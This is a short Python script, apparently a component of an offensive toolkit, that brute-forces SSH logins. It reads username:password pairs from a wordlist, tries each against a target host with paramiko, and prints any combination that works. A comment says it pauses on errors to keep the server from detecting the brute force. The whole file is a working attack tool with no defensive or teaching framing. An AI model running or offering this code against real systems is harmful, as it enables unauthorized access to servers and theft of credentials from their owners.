# Python Script for SSH Brute Force

# Importing Modules
import threading
import os
import paramiko
import socket
import time
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


class SSHBrute(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self)
        self.target = target

    def ssh_brute(self, hostname, username, password):
        # Initializing SSH Client
        client = paramiko.SSHClient()

        # Adding to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # Do when host is unreachable
            print(f"{RED}[SSH] Host: {hostname} is unreachable, timed out.{RESET}")
            return False
        except paramiko.AuthenticationException:
            # Do when username and password combination is incorrect
            print(f"[SSH] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            # Prevent server from detecting the brute force
            print(f"{BLUE}[SSH] Quota exceeded, retrying with delay...{RESET}")
            # Sleep for a minute
            time.sleep(60)
            return self.ssh_brute(hostname, username, password)
        else:
            # Connection has been established
            print(f"{GREEN}[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
            return True

    def run(self):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ssh_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.ssh_brute(self.target, username, password):
                break
